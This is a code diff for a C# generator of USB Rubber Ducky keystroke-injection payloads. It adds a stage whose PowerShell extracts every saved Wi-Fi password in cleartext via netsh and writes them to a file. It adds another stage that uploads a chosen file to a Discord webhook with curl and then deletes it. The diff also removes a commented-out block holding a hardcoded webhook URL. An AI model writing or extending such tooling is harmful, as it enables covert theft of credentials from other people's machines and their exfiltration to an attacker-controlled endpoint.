@@ -1,6 +1,7 @@
 using System.Diagnostics;
 using System.Text.Json;
 using System.Windows.Forms;
+using static DuckyScriptGenerator.Form1;
 
 namespace DuckyScriptGenerator
 {
@@ -95,6 +96,24 @@ namespace DuckyScriptGenerator
             else
             {
                 txtFILEDeleteFile.Enabled = false;
+            }
+        }
+
+        // ----------------------------------------------------------------------------------------------------- //
+        // 
+        //                                         GATHERING (STAGE 3)
+        //
+        // ----------------------------------------------------------------------------------------------------- //
+        private void cbWiFiPasswords_CheckedChanged(object sender, EventArgs e)
+        {
+            // Disables or Enables the text fields
+            if (cbWiFiPasswords.Checked)
+            {
+                txtGATHERoutputFile.Enabled = true;
+            }
+            else
+            {
+                txtGATHERoutputFile.Enabled = false;
             }
         }
 
@@ -227,18 +246,12 @@ namespace DuckyScriptGenerator
             }
 
 
-            // Have not implemented this yet (Stage 3)
-            string duckyCodeStage3 = $"REM Stage 4 Starts HERE...\r\n" + $"DELAY 500\r\n" + $"ENTER\r\n";
+            // Duckyscript for Stage 3 (Gathering)
+            string duckyCodeStage3 = $"REM Stage 3 Starts HERE...\r\n" + $"DELAY 500\r\n" + $"GUI r\r\n" + $"DELAY 1500\r\n" + $"STRING powershell\r\n" + $"DELAY 500\r\n" + $"ENTER\r\n" + $"DELAY 2000\r\n" + $"STRING ";
 
-            
-            // Have not implemented this yet (Stage 4)
-            string duckyCodeStage4 = $"REM Stage 4 Starts HERE...\r\n" + $"DELAY 500\r\n" + $"ENTER\r\n";
-            // $webhookUrl = "https://discord.com/api/webhooks/1070416409215107184/UAILaaOb37Vlb223hJuywdE8ysjpW4DSW7hA-g_nemnLabmF40vknnvov3I-4V4eYBTM";
-            // $fileToSend = "C:\Users\Public\SystemInfo.txt";
-            // $Body = @{ content = "Here's the file you requested." };
-            // $jsonBody = $Body | ConvertTo-Json;
-            // curl.exe -F "file1=@$fileToSend" $webhookUrl;
-            // Remove-Item $fileToSend -Force
+
+            // Duckyscript for Stage 4 (Exfil)
+            string duckyCodeStage4 = $"REM Stage 4 Starts HERE...\r\n" + $"DELAY 500\r\n" + $"ENTER\r\n" + $"STRING ";
 
 
             // The payload on stage 1/2.
@@ -265,23 +278,71 @@ namespace DuckyScriptGenerator
             if (cbDeleteFile.Checked)
             {
                 string DeleteFilePathName = txtFILEDeleteFile.Text;
-                // Construct the Duckyscript command for executing the file
+                // Construct the Duckyscript command for deleting the file
                 customContent += $"Remove-Item \"{DeleteFilePathName}\" -Force; ";
             }
 
             customContent += "exit";
 
-            // Construct the PowerShell command to execute the Duckyscript payload
+            // Construct the stage 1/2 PowerShell command to execute the Duckyscript payload
             string powershellCommand = $"powershell -c \"{customContent.Replace("\"", "\\\"")}\"";
+
+
+            // ADD MORE CONSTRUCTION FOR OTHER STAGES HERE!!!
+
+            // Construct the stage 3 Duckyscript payload
+            string stage3PowershellContent = "";
+
+            // Check if exfil with Discord Webhook option is selected and retrieve the token and file to send
+            if (cbWiFiPasswords.Checked)
+            {
+                string OutputPATH = txtGATHERoutputFile.Text;
+
+                // Construct the powershell command for sending the file to webhook.
+                stage3PowershellContent = @"(netsh wlan show profiles) | Select-String "":(.+)$"" | ForEach-Object { $_.Matches.Groups[1].Value.Trim() } | ForEach-Object { $profile = $_; $passwordInfo = (netsh wlan show profile name=""$profile"" key=clear) | Select-String ""Key Content\s+:(.+)$""; if ($passwordInfo) { $password = $passwordInfo.Matches.Groups[1].Value.Trim(); [PSCustomObject]@{ PROFILE_NAME = $profile; PASSWORD = $password } } } | Export-Csv -Path" + $" {OutputPATH} " + "-NoTypeInformation; ";
+
+            }
+
+            //if (cbBrowserPasswords.Checked)
+
+
+
+            // Exit powershell from stage 3
+            stage3PowershellContent += "\r\n";
+
+
+
+
+            // Construct the stage 4 Duckyscript payload
+            string stage4PowershellContent = "";
+
+            // Check if exfil with Discord Webhook option is selected and retrieve the token and file to send
+            if (cbDiscordWebhook.Checked)
+            {
+                string WebhookToken = txtEXFILWebhookTOKEN.Text;
+                string WebhookFileToSend = txtEXFILWebhookFileToSend.Text;
+
+                // Construct the powershell command for sending the file to webhook.
+                stage4PowershellContent += $"$webhookUrl = \"{WebhookToken}\"; " + $"$fileToSend = \"{WebhookFileToSend}\"; " + "$Body = @{ content = \"Here's the file you requested.\" }; " + "$jsonBody = $Body | ConvertTo-Json; curl.exe -F \"file1=@$fileToSend\" $webhookUrl; Remove-Item $fileToSend -Force; ";
+
+            }
+
+            //if (cbPostRequest.Checked)
+
+            // Exit powershell from stage 4
+            stage4PowershellContent += "exit\r\n";
+
+
+
 
             // Update the txtOutput textbox with the PowerShell command
             if (hasStage4)
             {
-                txtOutput.Text = duckyCodeStage1 + powershellCommand + duckyCodeStage2 + duckyCodeStage3 + duckyCodeStage4;
+                txtOutput.Text = duckyCodeStage1 + powershellCommand + duckyCodeStage2 + duckyCodeStage3 + stage3PowershellContent + duckyCodeStage4 + stage4PowershellContent + "ENTER\r\n"; // Added enter
             }
             else if (hasStage3)
             {
-                txtOutput.Text = duckyCodeStage1 + powershellCommand + duckyCodeStage2 + duckyCodeStage3;
+                txtOutput.Text = duckyCodeStage1 + powershellCommand + duckyCodeStage2 + duckyCodeStage3 + stage3PowershellContent + "ENTER\r\n"; // Added enter
             }
             else
             {
